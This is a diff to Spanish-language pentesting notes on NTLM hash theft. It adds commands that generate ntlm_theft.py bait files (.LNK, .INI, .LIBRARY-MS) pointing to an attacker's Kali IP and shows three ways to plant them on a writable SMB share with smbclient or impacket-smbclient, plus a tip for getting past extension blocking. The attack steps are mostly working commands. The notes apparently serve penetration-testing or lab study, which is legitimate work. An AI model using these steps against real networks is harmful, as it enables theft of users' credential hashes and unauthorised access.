@@ -23,6 +23,7 @@ Windows **automáticamente intenta NTLM authentication** cuando ve un archivo `.
 * [CVE-2025-24054](https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/)
 
 - Genera 21 archivos en una carpeta
+- Archivos clásicos: (.LNK, .INI, .LIBRARY-MS)
 
 ```bash 
 # Instalación 
@@ -33,6 +34,8 @@ Windows **automáticamente intenta NTLM authentication** cuando ve un archivo `.
 Paso 1:
 # Ejecución del script para generar los archivos a subir 
 ❯ python3 ntlm_theft.py --generate modern --server IP_Kali --filename "Intranet"
+
+❯ python3 ntlm_theft.py --generate all --server IP_Kali --filename "Intranet"
 ```
 
 ```bash 
@@ -41,11 +44,31 @@ Paso 2:
 ❯ ls /usr/share/responder/logs/    # Dir donde se guardan los logs capturados 
 ```
 
+- Si al subir los archivos de golpe muestra lo siguiente ``NT_STATUS_ACCESS_DENIED opening remote file \Intranet.lnk`` quiere decir que hay bloqueo de ciertas extensiones. Por lo que hay que subir uno por uno para detectar cual extensión si deja
+
 ```bash 
-Paso 3:
+Paso 3: Forma 1 de subir los archivos 
 ❯ cd Intranet
 ❯ smbclient -U 'domain.local/user%pass' //<IP>/"Human Resources" -c "prompt; mput *"
 # Subir todos los archivos creados del directorio actual "Intranet" en Kali al directorio del Server llamado "Human Resources"
+
+```
+
+```bash 
+Paso 3: Forma 2 de subir los archivos (Manual)
+❯ cd Intranet
+❯ smbclient -U 'domain.local/user%pass' //<IP>/"Human Resources"
+	❯ put <File.lnk>
+```
+
+```bash 
+Paso 3: Forma 3 de subir los archivos (Manual)
+❯ impacket-smbclient user:'pass'@domain.local
+	❯ use Shared       # Colocar el nombre del dir al que se tiene 'WRITE'
+	❯ put <File.lnk>   # Subir los archivos uno por uno 
+
+NOTA:
+	- Para esta forma hay que salir del entorno virtual y copiar todos los archivos al nuevo destino el cual es '/tmp'
 ```
 
 ```bash 
